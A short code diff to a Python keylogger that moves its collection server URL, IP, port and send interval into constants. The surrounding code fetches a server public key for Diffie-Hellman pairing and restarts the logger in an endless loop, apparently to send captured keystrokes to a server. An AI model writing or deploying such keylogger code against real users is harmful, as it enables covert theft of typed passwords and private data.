@@ -14,6 +14,11 @@ import sys
 
 
 HEADER_LENGTH = 24
+URL = "http://localhost:8080/message.txt"
+INTERVAL_SEND = 10
+SERVER_IP = "localhost"
+SERVER_PORT = 8081
+
 
 class Keylogger:
 
@@ -41,7 +46,7 @@ class Keylogger:
     def __pair_pkey(self):
         # update the public key of the server
         sleep(3)
-        r = self.__s.get(f"http://localhost:8080/message.txt")
+        r = self.__s.get(URL)
         clavepublica = bytes(r.text, 'ascii')
         dhpublica: dh.DHPublicKey = serialization.load_pem_public_key(clavepublica, backend=default_backend())
         self.__r.pairComm(dhpublica)
@@ -128,7 +133,7 @@ random.seed(10)
 while (True):
     try:
         # adding a print interval of a min of 5 seconds
-        keylogger = Keylogger(10, "127.0.0.1", 11234, HEADER_LENGTH)
+        keylogger = Keylogger(INTERVAL_SEND, SERVER_IP, SERVER_PORT, HEADER_LENGTH)
         # starting the keyloggger
         keylogger.start()
     except ConnectionError as e:
